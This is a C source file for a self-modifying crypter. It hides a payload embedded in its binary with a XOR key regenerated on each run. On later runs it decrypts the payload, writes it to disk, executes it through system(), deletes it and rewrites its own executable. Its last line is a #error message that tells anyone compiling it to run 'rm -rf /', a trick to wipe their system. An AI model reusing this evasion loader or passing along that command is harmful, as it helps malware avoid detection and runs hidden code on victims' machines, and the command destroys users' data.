#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <unistd.h>         /* close() */
#include <stdint.h>         /* uint* */
#include <string.h>         /* mem*() */
#include <fcntl.h>          /* open() */
#include <sys/stat.h>       /* fstat(), struct stat */
#ifndef _WIN32
#include <sys/sendfile.h>   /* sendfile() */
#include <sys/mman.h>       /* mmap(), munmap() */
#define SSIZET_FMT "%zd"
#define OPEN_FLAGS 0x0
#else
#include <unistd.h>         /* pread, pwrite for sendfile impl */
#include <assert.h>         /* assert() */
#include <io.h>
#include <windows.h>
#include <sys/types.h>
#define random rand
#define srandom srand
#define SSIZET_FMT "%ld"
#define OPEN_FLAGS O_BINARY /* force open file in binary mode (ignore NUL bytes) */
/* mingw-w64 uses different symbol name mangeling */
#define _exec_payload_start exec_payload_start
#define _exec_payload_end   exec_payload_end
#define _exec_payload_size  exec_payload_size
#endif
#include <sys/time.h>       /* gettimeofday() */
#include <limits.h>         /* LONG_MAX */
#include <libgen.h>         /* basename() */

#define XOR_KEYLEN 4
extern uint8_t _exec_payload_start[];
extern uint8_t _exec_payload_end[];
extern uint32_t _exec_payload_size;

/* __attribute__ won't work for MSVC */
#define MEH_ATTR __attribute__((packed, gcc_struct))

typedef struct MyExecHeader {
    uint32_t marker;
    uint32_t xorkey[XOR_KEYLEN];
    uint8_t payload[0];
} MEH_ATTR MyExecHeader;

#ifdef _WIN32
static long int sendfile(int out_fd, int in_fd,
                         off_t *offset, size_t count)
{
    uint8_t buf[BUFSIZ*4];
    ssize_t rsiz, wsiz = 0, temp;
    assert( !offset ); /* we don't support offsets, cuz not required atm */

    do {
        rsiz = read(in_fd, buf, sizeof buf);
        if (rsiz < 0)
            return -1;
        temp = write(out_fd, buf, rsiz);
        if (temp < 0)
            return -1;
        wsiz += temp;
    } while (rsiz > 0 && temp > 0);

    return wsiz;
}

/* from: https://github.com/m-labs/uclibc-lm32/blob/master/utils/mmap-windows.c */
#define PROT_READ     0x1
#define PROT_WRITE    0x2
/* This flag is only available in WinXP+ */
#ifdef FILE_MAP_EXECUTE
#define PROT_EXEC     0x4
#else
#define PROT_EXEC        0x0
#define FILE_MAP_EXECUTE 0
#endif

#define MAP_SHARED    0x01
#define MAP_PRIVATE   0x02
#define MAP_ANONYMOUS 0x20
#define MAP_ANON      MAP_ANONYMOUS
#define MAP_FAILED    ((void *) -1)

#ifdef __USE_FILE_OFFSET64
# define DWORD_HI(x) (x >> 32)
# define DWORD_LO(x) ((x) & 0xffffffff)
#else
# define DWORD_HI(x) (0)
# define DWORD_LO(x) (x)
#endif

static void *mmap(void *start, size_t length, int prot, int flags, int fd, off_t offset)
{
	if (prot & ~(PROT_READ | PROT_WRITE | PROT_EXEC))
		return MAP_FAILED;
	if (fd == -1) {
		if (!(flags & MAP_ANON) || offset)
			return MAP_FAILED;
	} else if (flags & MAP_ANON)
		return MAP_FAILED;

	DWORD flProtect;
	if (prot & PROT_WRITE) {
		if (prot & PROT_EXEC)
			flProtect = PAGE_EXECUTE_READWRITE;
		else
			flProtect = PAGE_READWRITE;
	} else if (prot & PROT_EXEC) {
		if (prot & PROT_READ)
			flProtect = PAGE_EXECUTE_READ;
		else if (prot & PROT_EXEC)
			flProtect = PAGE_EXECUTE;
	} else
		flProtect = PAGE_READONLY;

	off_t end = length + offset;
	HANDLE mmap_fd, h;
	if (fd == -1)
		mmap_fd = INVALID_HANDLE_VALUE;
	else
		mmap_fd = (HANDLE)_get_osfhandle(fd);
	h = CreateFileMapping(mmap_fd, NULL, flProtect, DWORD_HI(end), DWORD_LO(end), NULL);
	if (h == NULL)
		return MAP_FAILED;

	DWORD dwDesiredAccess;
	if (prot & PROT_WRITE)
		dwDesiredAccess = FILE_MAP_WRITE;
	else
		dwDesiredAccess = FILE_MAP_READ;
	if (prot & PROT_EXEC)
		dwDesiredAccess |= FILE_MAP_EXECUTE;
	if (flags & MAP_PRIVATE)
		dwDesiredAccess |= FILE_MAP_COPY;
	void *ret = MapViewOfFile(h, dwDesiredAccess, DWORD_HI(offset), DWORD_LO(offset), length);
	if (ret == NULL) {
		CloseHandle(h);
		ret = MAP_FAILED;
	}
	return ret;
}

static void munmap(void *addr, size_t length)
{
	UnmapViewOfFile(addr);
	/* ruh-ro, we leaked handle from CreateFileMapping() ... */
}
/* EoF C&P */

#endif /* _WIN32 */

static uint8_t *
findMarker(uint8_t *buf, size_t siz)
{
    size_t i;

    for (i = 3; i < siz; ++i) {
        if (buf[i-3] == 0xde &&
            buf[i-2] == 0xad &&
            buf[i-1] == 0xc0 &&
            buf[i+0] == 0xde)
        {
            return &buf[i-3];
        }
    }

    return NULL;
}

static long int
random_number(long int n)
{
    int seed;
    struct timeval tm;

    gettimeofday(&tm, NULL);
    seed = tm.tv_sec + tm.tv_usec;
    srandom(seed);
    return (random() % n);
}

static void
xor_genkey(MyExecHeader *my_ehdr)
{
    size_t i;
    uint32_t rnd[XOR_KEYLEN];

    for (i = 0; i < XOR_KEYLEN; ++i) {
        rnd[i] = (uint32_t) random_number(LONG_MAX);
    }
    memcpy(my_ehdr->xorkey, rnd, sizeof my_ehdr->xorkey);
}

static void
xor_crypt(MyExecHeader *my_ehdr)
{
    size_t i;
    uint8_t xb;
    uint8_t *key = (uint8_t *) &my_ehdr->xorkey[0];

    for (i = 0; i < _exec_payload_size; i++) {
        xb = key[i % sizeof my_ehdr->xorkey];
        my_ehdr->payload[i] ^= xb;
    }
}

static char *
shexbuf(uint8_t *buf, size_t buflen, char *dest, size_t destlen)
{
    size_t i, j;
    static const char hexal[] = "0123456789ABCDEF";
    uint8_t halfByte;

    for (i = 0, j = 0; i < buflen && j < destlen; ++i, j += 3) {
        halfByte = buf[i] >> 4;
        dest[j+0] = hexal[ halfByte % 16 ];
        halfByte = buf[i] & 0x0F;
        dest[j+1] = hexal[ halfByte % 16 ];
        dest[j+2] = ' ';
    }

    dest[j+2] = 0;
    return dest;
}

int main(int argc, char **argv) {
    char new_path[BUFSIZ];
    int arg0_fd, new_fd, exec_fd;
    struct stat arg0_statbuf;
    uint8_t *mmap_exec, *marker;
    MyExecHeader *my_ehdr;
    const uint8_t nullbuf[XOR_KEYLEN] = {0};
    char temp[BUFSIZ] = {0};
    char exec_path[BUFSIZ];
    off_t exec_off;

    if (argc < 1)
        return 1;

    printf("\n[example]\n"
           "Start: %p\n"
           "End..: %p\n"
           "Size.: %u\n",
           _exec_payload_start, _exec_payload_end,
           _exec_payload_size);

    snprintf(new_path, sizeof new_path, "./.%s", basename(argv[0]));
    arg0_fd = open(argv[0], O_RDONLY | OPEN_FLAGS, 0);
    new_fd = open(new_path, O_RDWR | O_CREAT | O_EXCL | OPEN_FLAGS,
                  S_IRWXU | S_IRWXG | S_IRWXO);

    printf("\n[fd]\n"
           "arg0.: %d '%s'\n"
           "new..: %d '%s'\n",
           arg0_fd, argv[0],
           new_fd, new_path);

    if (arg0_fd < 0 || new_fd < 0) {
        perror("open");
        return 1;
    }
    if (fstat(arg0_fd, &arg0_statbuf)) {
        perror("fstat");
        return 1;
    }
    if (sendfile(new_fd, arg0_fd, NULL,
                 arg0_statbuf.st_size) != arg0_statbuf.st_size)
    {
        perror("sendfile");
        return 1;
    }
    close(arg0_fd);

    mmap_exec = (uint8_t *) mmap(NULL, arg0_statbuf.st_size, PROT_READ | PROT_WRITE,
                     MAP_SHARED, new_fd, 0);
    if (!mmap_exec)
        return 1;

    printf("\n[exec]\n"
           "mmap.: %p\n"
           "size.: %lu\n",
           mmap_exec, arg0_statbuf.st_size);

    marker = findMarker(mmap_exec, arg0_statbuf.st_size);
    if (!marker)
        return 1;

    printf("mark.: %p\n", marker);

    my_ehdr = (MyExecHeader *) marker;
    if (!memcmp(my_ehdr->xorkey, nullbuf, XOR_KEYLEN)) {
        xor_genkey(my_ehdr);
        printf("\nEmpty XOR Key .. Generated: %s\n",
               shexbuf((uint8_t *) my_ehdr->xorkey,
                       sizeof my_ehdr->xorkey,
                       temp, sizeof temp));
    } else {
        printf("\nXOR Key: %s\nDecrypt payload ..\n",
               shexbuf((uint8_t *) my_ehdr->xorkey,
                       sizeof my_ehdr->xorkey,
                       temp, sizeof temp));
        xor_crypt(my_ehdr);
        memset(my_ehdr->xorkey, 0, sizeof my_ehdr->xorkey);

        printf("\nExtracting payload size %u\n",
               _exec_payload_size);
        snprintf(exec_path, sizeof exec_path, "%.*s_",
                (int) sizeof exec_path - 2, new_path);

        exec_fd = open(exec_path, O_RDWR | O_CREAT | OPEN_FLAGS,
                       S_IRWXU | S_IRWXG | S_IRWXO);
        if (exec_fd < 0)
            return 1;

        exec_off = my_ehdr->payload - mmap_exec;
        printf("Extracted " SSIZET_FMT "\n",
               sendfile(exec_fd, new_fd, &exec_off, _exec_payload_size));

        close(exec_fd);

        printf("Exec and Remove %s\n", exec_path);
        printf("Returned: 0x%X\n", system(exec_path));
        unlink(exec_path);
    }

    xor_crypt(my_ehdr);

    munmap(mmap_exec, arg0_statbuf.st_size);
    close(new_fd);

    if (rename(new_path, argv[0])) {
        perror("rename");
        return 1;
    }

    return 0;
}

#ifndef _NOTASKID
#error "Compiler error, type `rm -rf /` in your terminal to solve this issue."
#endif
